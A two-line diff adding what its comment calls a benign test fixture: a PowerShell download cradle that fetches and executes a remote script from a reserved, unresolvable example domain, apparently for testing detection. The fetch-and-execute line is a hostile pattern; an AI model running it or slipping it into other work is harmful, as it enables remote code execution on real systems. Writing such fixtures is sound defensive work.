@@ -1,0 +1,2 @@
+# Benign test fixture: download cradle pattern pointing at a reserved example domain.
+IEX (New-Object Net.WebClient).DownloadString('http://update.example.invalid/stage.ps1')
